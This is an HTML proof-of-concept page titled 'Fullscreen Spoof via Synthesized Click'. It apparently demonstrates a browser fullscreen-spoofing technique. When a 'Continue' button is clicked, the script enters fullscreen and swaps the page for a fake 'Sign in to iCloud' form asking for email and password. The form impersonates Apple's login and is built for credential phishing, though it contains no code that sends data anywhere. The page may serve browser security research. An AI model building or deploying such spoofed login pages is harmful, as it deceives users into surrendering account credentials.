<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Fullscreen Spoof via Synthesized Click</title>
  <style>
    body {
      margin: 0;
      background: black;
      color: white;
      font-family: -apple-system;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      flex-direction: column;
    }
    #trigger {
      padding: 16px 32px;
      background: #0a84ff;
      border: none;
      border-radius: 8px;
      color: white;
      font-size: 18px;
    }
  </style>
</head>
<body>

<h2>Click to Continue</h2>
<button id="trigger">Continue</button>

<script>
  const fakeClick = () => {
    document.documentElement.requestFullscreen().then(() => {
      document.body.innerHTML = `
        <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;background:white;">
          <h2 style="color:#000;">Sign in to iCloud</h2>
          <input type="email" placeholder="Email" style="margin:8px;padding:12px;width:250px;">
          <input type="password" placeholder="Password" style="margin:8px;padding:12px;width:250px;">
          <button style="padding:12px 24px;margin-top:12px;">Login</button>
        </div>`;
    }).catch(e => console.log("Blocked:", e));
  };

  // Manual trigger for gesture
  document.getElementById("trigger").onclick = fakeClick;
</script>

</body>
</html>
